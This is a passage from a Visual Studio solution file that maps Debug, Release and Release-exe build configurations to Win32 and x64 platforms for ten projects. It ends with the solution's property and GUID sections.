		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Release|Win32.ActiveCfg = Release|Win32
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Release|Win32.Build.0 = Release|Win32
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Release|x64.ActiveCfg = Release|x64
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Release|x64.Build.0 = Release|x64
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Release-exe|Win32.ActiveCfg = Release|Win32
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Release-exe|Win32.Build.0 = Release|Win32
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Release-exe|x64.ActiveCfg = Release|x64
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Release-exe|x64.Build.0 = Release|x64
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Debug|Win32.ActiveCfg = Debug|Win32
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Debug|Win32.Build.0 = Debug|Win32
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Debug|x64.ActiveCfg = Debug|x64
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Debug|x64.Build.0 = Debug|x64
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Release|Win32.ActiveCfg = Release|Win32
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Release|Win32.Build.0 = Release|Win32
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Release|x64.ActiveCfg = Release|x64
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Release|x64.Build.0 = Release|x64
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Release-exe|Win32.ActiveCfg = Release|Win32
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Release-exe|Win32.Build.0 = Release|Win32
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Release-exe|x64.ActiveCfg = Release|x64
		{F1086A6A-6629-43C1-BA21-9DF06A03FE18}.Release-exe|x64.Build.0 = Release|x64
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Debug|Win32.ActiveCfg = Debug|Win32
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Debug|Win32.Build.0 = Debug|Win32
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Debug|x64.ActiveCfg = Debug|x64
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Debug|x64.Build.0 = Debug|x64
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Release|Win32.ActiveCfg = Release|Win32
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Release|Win32.Build.0 = Release|Win32
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Release|x64.ActiveCfg = Release|x64
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Release|x64.Build.0 = Release|x64
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Release-exe|Win32.ActiveCfg = Release|Win32
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Release-exe|Win32.Build.0 = Release|Win32
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Release-exe|x64.ActiveCfg = Release|x64
		{D8D563AC-3E35-4CE7-B951-EC9126766293}.Release-exe|x64.Build.0 = Release|x64
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Debug|Win32.ActiveCfg = Debug|Win32
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Debug|Win32.Build.0 = Debug|Win32
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Debug|x64.ActiveCfg = Debug|x64
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Debug|x64.Build.0 = Debug|x64
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Release|Win32.ActiveCfg = Release|Win32
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Release|Win32.Build.0 = Release|Win32
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Release|x64.ActiveCfg = Release|x64
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Release|x64.Build.0 = Release|x64
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Release-exe|Win32.ActiveCfg = Release-exe|Win32
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Release-exe|Win32.Build.0 = Release-exe|Win32
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Release-exe|x64.ActiveCfg = Release-exe|x64
		{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}.Release-exe|x64.Build.0 = Release-exe|x64
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Debug|Win32.ActiveCfg = Debug|Win32
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Debug|Win32.Build.0 = Debug|Win32
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Debug|x64.ActiveCfg = Debug|x64
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Debug|x64.Build.0 = Debug|x64
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Release|Win32.ActiveCfg = Release|Win32
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Release|Win32.Build.0 = Release|Win32
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Release|x64.ActiveCfg = Release|x64
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Release|x64.Build.0 = Release|x64
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Release-exe|Win32.ActiveCfg = Release|Win32
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Release-exe|Win32.Build.0 = Release|Win32
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Release-exe|x64.ActiveCfg = Release|x64
		{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}.Release-exe|x64.Build.0 = Release|x64
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Debug|Win32.ActiveCfg = Debug|Win32
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Debug|Win32.Build.0 = Debug|Win32
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Debug|x64.ActiveCfg = Debug|x64
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Debug|x64.Build.0 = Debug|x64
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Release|Win32.ActiveCfg = Release|Win32
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Release|Win32.Build.0 = Release|Win32
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Release|x64.ActiveCfg = Release|x64
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Release|x64.Build.0 = Release|x64
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Release-exe|Win32.ActiveCfg = Release-exe|Win32
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Release-exe|Win32.Build.0 = Release-exe|Win32
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Release-exe|x64.ActiveCfg = Release-exe|x64
		{9FC77B53-D4D9-4DCC-B31D-B425C484B559}.Release-exe|x64.Build.0 = Release-exe|x64
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Debug|Win32.ActiveCfg = Debug|Win32
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Debug|Win32.Build.0 = Debug|Win32
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Debug|x64.ActiveCfg = Debug|x64
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Debug|x64.Build.0 = Debug|x64
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Release|Win32.ActiveCfg = Release|Win32
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Release|Win32.Build.0 = Release|Win32
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Release|x64.ActiveCfg = Release|x64
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Release|x64.Build.0 = Release|x64
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Release-exe|Win32.ActiveCfg = Release-exe|Win32
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Release-exe|Win32.Build.0 = Release-exe|Win32
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Release-exe|x64.ActiveCfg = Release-exe|x64
		{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}.Release-exe|x64.Build.0 = Release-exe|x64
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Debug|Win32.ActiveCfg = Debug|Win32
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Debug|Win32.Build.0 = Debug|Win32
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Debug|x64.ActiveCfg = Debug|x64
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Debug|x64.Build.0 = Debug|x64
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Release|Win32.ActiveCfg = Release|Win32
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Release|Win32.Build.0 = Release|Win32
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Release|x64.ActiveCfg = Release|x64
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Release|x64.Build.0 = Release|x64
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Release-exe|Win32.ActiveCfg = Release-exe|Win32
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Release-exe|Win32.Build.0 = Release-exe|Win32
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Release-exe|x64.ActiveCfg = Release-exe|x64
		{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}.Release-exe|x64.Build.0 = Release-exe|x64
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Debug|Win32.ActiveCfg = Debug|Win32
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Debug|Win32.Build.0 = Debug|Win32
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Debug|x64.ActiveCfg = Debug|x64
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Debug|x64.Build.0 = Debug|x64
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Release|Win32.ActiveCfg = Release|Win32
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Release|Win32.Build.0 = Release|Win32
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Release|x64.ActiveCfg = Release|x64
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Release|x64.Build.0 = Release|x64
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Release-exe|Win32.ActiveCfg = Release|Win32
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Release-exe|Win32.Build.0 = Release|Win32
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Release-exe|x64.ActiveCfg = Release|x64
		{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}.Release-exe|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {AF0C8B97-8C66-46EB-B0FC-5D1240BA272B}
	EndGlobalSection
EndGlobal
